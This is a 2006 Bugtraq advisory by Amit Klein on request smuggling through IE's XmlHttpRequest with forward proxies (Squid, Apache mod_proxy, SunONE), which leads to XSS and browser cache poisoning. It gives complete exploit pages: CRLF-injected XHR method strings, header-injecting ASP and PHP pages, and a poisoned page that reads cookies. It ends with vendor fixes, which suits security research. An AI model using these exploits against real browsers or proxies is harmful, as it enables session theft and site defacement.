@@ -1,0 +1,441 @@
+
+Date: Mon, 22 May 2006 08:38:27 +0200
+From: "Amit Klein (AKsecurity)" <aksecurity@...pop.com>
+To: bugtraq@...urityfocus.com
+Subject: Write-up by Amit Klein:
+ "IE + some popular forward proxy servers = XSS, defacement (browser cache
+ poisoning)"
+
+
+   IE + some popular forward proxy servers = XSS, defacement 
+                (browser cache poisoning)
+
+                           Or
+
+     "Exploiting the XmlHttpRequest object in IE" part II
+
+                   Amit Klein, May 2006
+
+
+Preface
+=======
+
+When I published my Exploiting the XmlHttpRequest object in IE - 
+Referrer spoofing and a lot more..." [1] paper, I only mentioned 
+an important attack vector in 1-2 sentences. To quote: "This may 
+enable the attacker to conduct various cross-domain attacks 
+(XSS), and this is in fact demonstrated for Firefox in [4] (but I 
+haven't tested it on IE)."
+
+Well, finally I found the time to demonstrate this vector on IE, 
+with several popular forward proxy servers. The results are quite 
+powerful, and indicate that the vulnerability is more serious 
+than perhaps realized earlier.
+
+
+Introduction
+============
+
+In this write-up, I demonstrate how the security issue discussed 
+in [1] can be exploited to force an XSS condition and/or a 
+browser cache poisoning condition in IE 6.0 SP2, provided it is 
+configured to use a forward proxy server (the attack was verified 
+on Squid 2.5.STABLE10-NT, Apache/2.0.55 mod_proxy and Sun Java 
+System Web Proxy Server 4.0 [AKA SunONE proxy 4.0]) but I believe 
+it would practically work on almost all forward proxy servers, 
+possibly up to some tweaking in the exploitation code).
+
+The root cause is the fact that 2 requests can be injected via 
+the XmlHttpRequest object (henceforth XHR; a key component of the 
+AJAX technology), coupled with the fact that IE sends requests 
+for different hosts on the same TCP connection when it uses a 
+forward proxy server.
+
+The attack idea is simple: the user visits the malicious website, 
+and it, using an XHR object, injects 2 requests (where the 
+browser thinks only one request is present) through the proxy 
+server, to the malicious website. The proxy sends back 2 
+responses, the browser consumes one for the XHR object, and then 
+the malicious Javascript code forces the browser to send another 
+request (to the target website). This request is then matched to 
+the 2nd response (queued at the browser response queue), and thus 
+we have the XSS condition and the browser cache poisoning 
+condition (which is effectively a "local defacement", at the 
+browser level).
+
+The XSS vector was in fact outlined by Yutaka Oiwa for FireFox 
+1.0.6 in [2] - and that advisory was also originally referenced 
+in [1], yet it is unclear whether Yutaka Oiwa actually lab-tested 
+this particular XSS (and browser cache poisoning) attack.
+
+Please note: this is not a new vulnerability per-se; the basic 
+exploitation was discussed in [1] (and in [2] for FireFox) almost 
+8 months ago. And the basic flaw in IE's implementation of XHR 
+was discussed in [3] over THREE years ago. This is merely a 
+demonstration of possible outcomes (=attack vectors). Yet I think 
+that their gravity justifies this write-up.
+
+Also note that for brevity's sake, I don't discuss other vectors, 
+such as stealing credentials (including basic HTTP authentication 
+credentials and HttpOnly cookies). That vector was also mentioned 
+in [2] (for FireFox).
+
+
+The basic scenario - demonstrated with Squid 2.5.STABLE10-NT
+============================================================
+
+In essence, the attack comprises of setting up a malicious server 
+(www.evil.site) with 3 pages (http://www.evil.site/1.html, 
+http://www.evil.site/2.html and http://www.evil.site/3.html). In 
+this case, the pages are pure, static HTML pages. The pages will 
+be detailed below; the victim (IE user) is handed a link to the 
+first page, i.e. http://www.evil.site/1.html. Upon clicking this 
+link, an XSS condition is incurred, as well as a local 
+defacement, to the website URL embedded in 
+http://www.evil.site/1.html (in this paper's example, it's 
+http://www.target.site/). As can be appreciated, this has serious 
+implications on www.target.site - while this site can be totally 
+secure, still there's an XSS condition enabling the attacker to 
+steal credentials, etc. Moreover, the browser caches the spoofed 
+www.target.site page, so every subsequent access to 
+http://www.target.site/ by this IE user results in displaying the 
+spoofed page.
+
+Here are the 3 pages needed:
+
+http://www.evil.site/1.html:
+
+  <html>
+  <body>
+  <script>
+  var x = new ActiveXObject("Microsoft.XMLHTTP");
+  x.open("GET\thttp://www.evil.site/2.html\tHTTP/1.1\r\nHost:\twww.evil.site\r\nProxy-
+Connection:\tKeep-Alive\r\n\r\nGET","/3.html",false);
+  x.send();
+  window.open("http://www.target.site/");
+  </script>
+  </body>
+  </html>
+
+http://www.evil.site/2.html:
+
+  <html>
+  <body>
+  foo
+  </body>
+  </html>
+
+http://www.evil.site/3.html:
+
+  <html>
+  <head>
+  <meta http-equiv="Expires" content="Wed, 01 Jan 2020 00:00:00 GMT">
+  <meta http-equiv="Cache-Control" content="public">
+  <meta http-equiv="Last-Modified" content="Fri, 01 Jan 2010 00:00:00 GMT">
+  </head>
+  <body>
+  <script>
+  alert("DEFACEMENT and XSS: your cookie is"+document.cookie)
+  </script>
+  </body>
+  </html>
+
+Notice the Proxy-Connection: Keep-Alive header inserted to the 
+request stream in 1.html - for some reason, Squid does not 
+maintain HTTP connection persistence unless this header is 
+provided in the request (even when the request is in HTTP/1.1). 
+
+The attack flow is as following: 
+1. The browser loads 1.html, invokes the XHR object, and sends 
+   what it thinks is a single request (with weird method, to 
+   http://www.evil.site/3.html). This stream is sent to Squid. 
+2. Squid parses the stream, sees the first HTTP request - to 
+   http://www.evil.site/2.html. It serves this request, which 
+   is a dummy page.
+3. Squid then sees the second HTTP request in the stream, this 
+   time to http://www.evil.site/3.html. It serves this request 
+   as well. 
+4. The browser reads the first request from the response 
+   stream. It is the content of http://www.evil.site/2.html, 
+   which the browser matches to the XHR object request.
+5. The browser then proceeds with the Javascript execution in 
+   1.html, and it sends a request to http://www.target.site/. 
+   This is immediately matched to the second proxy response, 
+   i.e. to the content of http://www.evil.site/3.html. Thus, 
+   http://www.evil.site/3.html is considered by the browser to 
+   be http://www.target.site/, with XSS condition and browser 
+   cache poisoning condition as a consequence.
+
+Regarding the various cache related headers in 
+http://www.evil.site/3.html, and regarding the longevity of the 
+browser cache poisoning (local defacement) attack, see [6].
+
+
+Sun Java System Web Proxy Server 4.0
+====================================
+
+Basically the exploit for Sun Java System Web Proxy Server 4.0 is 
+very similar to the one used for Squid. The only differences are 
+that Java System Web Proxy Server 4.0 does not support HTTP 
+connection persistence for HTTP/1.0 requests, and it doesn't need 
+the Proxy-Connection: Keep-Alive header for HTTP/1.1 requests. So 
+this can be safely removed from 1.html (but can just as well be 
+kept there).
+
+A more problematic aspect of Sun Java System Web Proxy Server 4.0 
+is the fact that it doesn't send the Proxy-Connection: Keep-Alive 
+header in the response. This makes IE believe that the proxy 
+wants to terminate the connection (IE, after all, assumes that 
+the connection is HTTP/1.0, whose default is to close the 
+connection). One can overcome this by forcing this header with 
+the pages sent out, i.e. with 2.html and 3.html. This is a simple 
+matter of replacing 2.html and 3.html with dynamic pages (e.g. 
+ASP, PHP, etc.) that add "Proxy-Connection: Keep-Alive" to the 
+response headers.
+
+The exploit would be as following (assuming ASP):
+
+http://www.evil.site/1.html:
+
+  <html>
+  <body>
+  <script>
+  var x = new ActiveXObject("Microsoft.XMLHTTP");
+  
+x.open("GET\thttp://www.evil.site/2.asp\tHTTP/1.1\r\nHost:\twww.evil.site\r\n\r\nGET\thttp:
+//www.evil.site/3.asp\tHTTP/1.1\r\nFoo:","bar",false);
+  x.send();
+  window.open("http://www.target.site/");
+  </script>
+  </body>
+  </html>
+
+http://www.evil.site/2.asp:
+  <%
+  Response.addHeader "Proxy-Connection","Keep-Alive"
+  %>
+  <html>
+  <body>
+  foo
+  </body>
+  </html>
+
+http://www.evil.site/3.asp:
+
+  <%
+  Response.addHeader "Proxy-Connection","Keep-Alive"
+  %>
+  <html>
+  <head>
+  <meta http-equiv="Expires" content="Wed, 01 Jan 2020 00:00:00 GMT">
+  <meta http-equiv="Cache-Control" content="public">
+  <meta http-equiv="Last-Modified" content="Fri, 01 Jan 2010 00:00:00 GMT">
+  </head>
+  <body>
+  <script>
+  alert("DEFACEMENT and XSS: your cookie is"+document.cookie)
+  </script>
+  </body>
+  </html>
+
+Obviously, ASP is not essential for this attack, it can be 
+realized with any method that can add the Proxy-Connection: Keep-
+Alive to the response headers of the second and third pages.
+
+The above attack outline was indeed verified with Sun Java System 
+Web Proxy Server 4.0.
+ 
+
+A more complex scenario - Apache/2.0.55 mod_proxy
+=================================================
+
+Apache/2.0.55 mod_proxy is somewhat similar to Sun Java System 
+Web Proxy Server 4.0 in that it doesn't send out Proxy-
+Connection: Keep-Alive. Also for some reason, it seems that 
+Apache/2.0.55 is faster than Sun Java System Web Proxy Server 4.0 
+and Squid 2.5, and thus the second response (to 2.html) appears 
+in the end of the 1024 bytes buffer read by IE with the first 
+response (for a detailed discussion of how IE handles the 
+response stream, please refer to [4]). This means we need to pad 
+3.html to a buffer boundary, taking into consideration all the 
+response for 2.html as well.
+
+The only thing left is to force Apache mod_proxy to send out 
+Proxy-Connection: Keep-Alive header. This turns out to be not 
+quite trivial. Just sending this header as part of the response 
+from www.evil.site (as shown above with Sun Java System Web Proxy 
+Server 4.0) is not enough - Apache mod_proxy actively strips out 
+this header. A more sophisticated approach should be taken, 
+calling to aid the techniques developed in [5]. The solution is 
+to arrange for the response from www.evil.site to include a 
+header sequence with a CR instead of CRLF:
+
+  Foo: bar CR Proxy-Connection: Keep-Alive 
+
+Thereby arriving at the desired scenario: Apache mod_proxy 
+understands this as a Foo header, thus not stripping it away, 
+while IE understands this as two headers - Foo: bar and Proxy-
+Connection: Keep-Alive. 
+
+With PHP, this can be realized as following:
+
+  <?php
+  header("Foo: bar\rProxy-Connection: Keep-Alive");
+  ?>
+  <html>
+  <body>
+  foo
+  </body>
+  </html>
+
+Of course, as recommended in [5], PHP shouldn't be allowed to 
+inject CR in the header function, but this is immaterial - 
+remember that www.evil.site is fully controlled by the attacker, 
+and this functionality can be implemented in Perl, or even via a 
+customized web server.
+
+This is enough for the XSS condition, but not for browser cache 
+defacement. That's due to the fact that there is no Proxy-
+Connection: Keep-Alive in the response to 
+http://www.target.site/, and again, IE waits until the connection 
+is terminated. It seems that this prevents IE from caching the 
+resource. Overcoming that is a simple matter of adding this 
+header to 3.html.
+
+The working exploit is, therefore:
+
+http://www.evil.site/1.html:
+
+  <html>
+  <body>
+  <script>
+  var x = new ActiveXObject("Microsoft.XMLHTTP");
+  
+x.open("GET\thttp://www.evil.site/2.php\tHTTP/1.1\r\nHost:\twww.evil.site\r\n\r\nGET\thttp:
+//www.evil.site/3.html\tHTTP/1.1\r\nFoo:","/bar",false);
+  x.send();
+  window.open("http://www.target.site/");
+  </script>
+  </body>
+  </html>
+
+http://www.evil.site/2.php: 
+
+  <?php
+  header("Foo: bar\rProxy-Connection: Keep-Alive");
+  ?>
+  <html>
+  <body>
+  foo
+  </body>
+  </html>
+
+http://www.evil.site/3.html:
+  [padding to 1024 bytes including the response to the previous 
+   request]
+  HTTP/1.1 200 OK
+  Content-Length: 114
+  Content-Type: text/html
+  Cache-Control: public
+  Expires: Wed, 01 Jan 2020 00:00:00 GMT
+  Last-Modified: Wed, 17 May 2006 00:00:00 GMT
+  Proxy-Connection: Keep-Alive
+
+  <html>
+  <body>
+  <script>
+  alert("DEFACEMENT and XSS: your cookie is"+document.cookie)
+  </script>
+  </body>
+  </html>
+
+The above attack outline was indeed verified with Apache 2.0.55 
+mod_proxy.
+
+
+Recommendations
+===============
+
+Mostly quoted almost as-is from [1]:
+
+Site owners
+-----------
+
+- Use SSL (as always).
+
+Vendors
+-------
+
+- Microsoft is encouraged to filter HT, CR and LF in the method 
+  parameter of XHR (HT filtering was recommended in [3] over 3 
+  years ago). Other browser vendors are encouraged to check whether 
+  their implementation is vulnerable.
+
+- Proxy server vendors are encouraged not to allow raw HT in 
+  the request line.
+
+- Microsoft (and other HTTP client vendors - browsers and proxy 
+  servers alike) is encouraged not to share a single TCP connection 
+  to the server for requests to different hosts when IE uses a 
+  forward proxy server.
+
+
+Summary
+=======
+
+While this is not a new vulnerability, and in some sense not even 
+a new attack vector, the net effect demonstrated here is 
+disturbing to say the least: IE with the latest service pack, 
+when used with many popular forward proxy servers (which is, I 
+believe, quite a common scenario - think corporate America, 
+universities, some ISPs), is vulnerable to XSS (regardless of the 
+target website) and "local defacement". 
+
+
+References
+==========
+
+[1] "Exploiting the XmlHttpRequest object in IE - Referrer spoofing,
+    and a lot more...", Amit Klein, September 2005
+    http://www.securityfocus.com/archive/1/411585
+
+[2] "setRequestHeader can be exploited using newline characters", 
+    Bugzilla bug 297078
+    https://bugzilla.mozilla.org/show_bug.cgi?id=297078#c12  (Yutaka
+    Oiwa's advisory)
+
+[3] "XS(T) attack variants which in some cases, eliminate the 
+    need for TRACE", Amit Klein, WebAppSec mailing list submission, 
+    January 26th, 2003
+    http://www.securityfocus.com/archive/107/308433
+
+[4] "Divide and Conquer - HTTP Response Splitting, Web Cache 
+    poisoning and Related Topics", Amit Klein, March 2004
+    http://www.packetstormsecurity.org/papers/general/whitepaper_httpresponse.pdf
+
+[5] "HTTP Response Smuggling", Amit Klein, March 2006
+    http://www.securityfocus.com/archive/1/425593
+
+[6] "Domain Contamination", Amit Klein, February 2006
+    http://www.webappsec.org/projects/articles/020606.txt
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
